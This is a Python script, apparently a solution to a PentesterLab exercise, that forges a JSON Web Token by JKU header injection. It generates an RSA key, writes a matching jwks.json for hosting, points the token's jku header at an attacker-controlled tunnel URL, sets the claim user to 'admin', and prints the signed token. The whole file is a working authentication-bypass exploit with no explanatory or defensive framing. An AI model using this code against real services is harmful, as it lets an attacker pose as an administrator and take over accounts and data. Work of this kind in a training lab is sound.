import OpenSSL
import base64
import json
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

key = OpenSSL.crypto.PKey()
key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)

header= {"typ": "JWT","alg": "RS256","jku": "https://olive-worms-hug.loca.lt/jwks.json"}
payload = {"user": "admin"}
jwk = {
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "pentesterlab",
      "alg": "RS256"
    }
  ]
}

priv = key.to_cryptography_key()
pub = priv.public_key()

e = pub.public_numbers().e
n = pub.public_numbers().n

jwk["keys"][0]["e"] = base64.urlsafe_b64encode((e).to_bytes((e).bit_length()//8+1,byteorder='big')).decode('utf-8').rstrip('=')
jwk["keys"][0]["n"] = base64.urlsafe_b64encode((n).to_bytes((n).bit_length()//8+1,byteorder='big')).decode('utf-8').rstrip('=')


f = open("jwks.json","w")
f.write(json.dumps(jwk))
f.close()

payload64 = base64.urlsafe_b64encode(bytes(json.dumps(payload),encoding='utf-8')).decode('utf-8').rstrip('=')
header64 = base64.urlsafe_b64encode(bytes(json.dumps(header),encoding='utf-8')).decode('utf-8').rstrip('=')

str = header64+'.'+payload64

sig = priv.sign(bytes(str, encoding='utf-8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15())

print(str+'.'+base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('='))
